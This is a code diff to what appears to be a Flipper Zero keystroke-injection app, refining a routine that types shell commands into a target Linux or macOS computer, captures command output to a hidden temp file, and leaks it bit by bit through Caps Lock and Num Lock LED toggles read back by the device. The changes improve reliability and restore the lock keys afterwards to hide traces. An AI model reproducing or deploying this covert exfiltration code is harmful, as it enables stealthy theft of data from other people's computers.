@@ -775,30 +775,32 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
                              "Start-Sleep -m 30"
                              "}}");
         } else if(os == FPwnOSLinux) {
-            /* Bash + xdotool: capture → transmit bit by bit */
+            /* Bash + xdotool: capture → transmit bit by bit.
+             * _cl tracks CapsLock state so we toggle only when needed. */
             fpwn_type_string(" > /tmp/.fpd 2>&1; "
-                             "_d=$(cat /tmp/.fpd; printf '\\x04'); "
+                             "_d=$(cat /tmp/.fpd; printf '\\x04'); _cl=0; "
                              "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
                              "_b=$((16#$_c)); "
                              "for _i in $(seq 7 -1 0); do "
                              "_v=$(( (_b>>_i)&1 )); "
-                             "if [ $_v -eq 1 ]; then "
-                             "xdotool key Caps_Lock; fi; "
+                             "if [ $_v -ne $_cl ]; then "
+                             "xdotool key Caps_Lock; _cl=$_v; fi; "
                              "sleep 0.03; "
                              "xdotool key Num_Lock; "
                              "sleep 0.03; "
                              "done; done; rm -f /tmp/.fpd");
         } else if(os == FPwnOSMac) {
-            /* macOS: osascript for key simulation */
+            /* macOS: osascript for key simulation.
+             * _cl tracks CapsLock state so we toggle only when needed. */
             fpwn_type_string(
                 " > /tmp/.fpd 2>&1; "
-                "_d=$(cat /tmp/.fpd; printf '\\x04'); "
+                "_d=$(cat /tmp/.fpd; printf '\\x04'); _cl=0; "
                 "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
                 "_b=$((16#$_c)); "
                 "for _i in $(seq 7 -1 0); do "
                 "_v=$(( (_b>>_i)&1 )); "
-                "if [ $_v -eq 1 ]; then "
-                "osascript -e 'tell application \"System Events\" to key code 57'; fi; "
+                "if [ $_v -ne $_cl ]; then "
+                "osascript -e 'tell application \"System Events\" to key code 57'; _cl=$_v; fi; "
                 "sleep 0.03; "
                 "osascript -e 'tell application \"System Events\" to key code 71'; "
                 "sleep 0.03; "
@@ -821,7 +823,8 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             view_commit_model(app->execute_view, true);
         }
 
-        uint8_t prev_led = furi_hal_hid_get_led_state();
+        uint8_t initial_led = furi_hal_hid_get_led_state();
+        uint8_t prev_led = initial_led;
         uint8_t current_byte = 0;
         uint8_t bit_count = 0;
         uint32_t last_clock = furi_get_tick();
@@ -862,13 +865,20 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             furi_delay_ms(2); /* 2 ms poll — fast enough for 30 ms clock period */
         }
 
-        /* Restore CapsLock to its pre-exfil state if the target script left it dirty */
+        /* Restore CapsLock and NumLock to their pre-exfil state */
         {
             uint8_t final_led = furi_hal_hid_get_led_state();
-            if((final_led ^ prev_led) & HID_KB_LED_CAPS) {
+            if((final_led ^ initial_led) & HID_KB_LED_CAPS) {
                 furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
                 furi_delay_ms(2);
                 furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+                furi_delay_ms(50);
+            }
+            if((final_led ^ initial_led) & HID_KB_LED_NUM) {
+                furi_hal_hid_kb_press(HID_KEYPAD_NUMLOCK);
+                furi_delay_ms(2);
+                furi_hal_hid_kb_release(HID_KEYPAD_NUMLOCK);
+                furi_delay_ms(50);
             }
         }
 
